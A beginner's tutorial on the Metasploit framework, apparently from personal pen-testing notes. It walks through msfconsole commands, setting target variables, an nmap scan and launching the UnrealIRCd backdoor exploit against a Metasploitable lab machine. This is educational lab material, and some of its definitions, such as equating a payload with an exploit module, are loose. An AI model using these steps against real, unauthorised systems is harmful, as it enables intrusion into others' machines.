# Metasploit
Metasploit is a framework used in pen-testing that simplified hacking.

## Vocabulary
- Payload = **exploit module**. They are simple scripts used to interact with the target. A payload can transfer data to the victim's system.
- Exploit = **a hacking activity**. An exploit is either  **active** : exploit a specific host, run until completion, and then exit *or* **passive**: wait for incoming hosts and exploit them as they connect.

Command to force an active exploit to work in the background
````
exploit -j
````
             
Command to enumerate a passive exploit

````
sessions -l
````
                                                       
## How to use
- Pick a target
- Choose and exploit
- Pick a payload to drop
- Start the exploit

## Useful commands
To access the Metasploit console. After entering the command, we will see the ```` msf > ```` header, indicating we have sucessfully entered the console

````
msfconsole
````
Access the help menu. This menu is really helpful if you want to look up the list of available commands to use.

```
help
```
To show the list of available exploits we can use

````
show exploits
````


To use an exploit:

```
use <exploit name>
```

Example: 
We want to use the unreal exploit
```
msf > use exploit/unix/irc/unreal_ircd_3281_backdoor
```
When you're using an exploit, we will see the cmd change: 

![ss](/img/msf.png)


Metasploit can be customized for each case as well. To do this, use the ```set``` command

The attributes we can modify are called **variables**
There are 4 most used variables:
**LHOST** = Local Host, or Kali System
**RHOSt** = Remote Host, or our target system
**LPORT** = Port we want to use on our Kali System
**RPORT** = Port we want to attack on our target system

To see all the variables, use the ```show``` command

```show options```

![ss](/img/msf2.png)

This particular exploit uses 2 varibles, RPORT and RHOST. We can edit these variables to match our target's system.

use the below command to see which targets are available to lauch our exploit. We can set multiple targets depending on our exploits as well.

``` show targets```

![ss](/img/msf3.png)

This means we have not assign a target yet, so let's do that! We will need a vulnerable machine to be our target

The easiest way to set up a vulnerable machine is by using Metasploitable. Let's head over to [Metasploitable](https://github.com/songmayphan/Offensive-Security/blob/main/Metasploitable.md) README to see how to set up your target.


# Starting an exploit

## Set up the exploit's variables

This particular exploit uses 2 varibles, RPORTS and RHOST. We can edit these variables to match our target's system.
To do this, run the ```set``` command

RHOST is our target's hos. We got this from run ```ifconfig``` on our target machine.
````set RHOSTS 192.168.1.52````

![ss](/img/msf5.PNG)

run ```show options``` to see that our target host has been set up

![ss](/img/msf6.PNG)

To find a vulnerable port on our target machine, use NMAP Security Scanner on our attacking machine

````nmap 192.168.1.52````
We'll see that port 6667 (default on our exploit) is open, which is good. We can keep it that way

![ss](/img/msf8.PNG)

This is all we need right now to run this exploit. Run the exploit command to execute it

```exploit```

We had just finished our first exploit with Metasploit :congratulation:

For more information, visit these links below

[Vulnerability Guide Metasploit] (https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide)
[Metasploit main Website] (https://www.metasploit.com/)

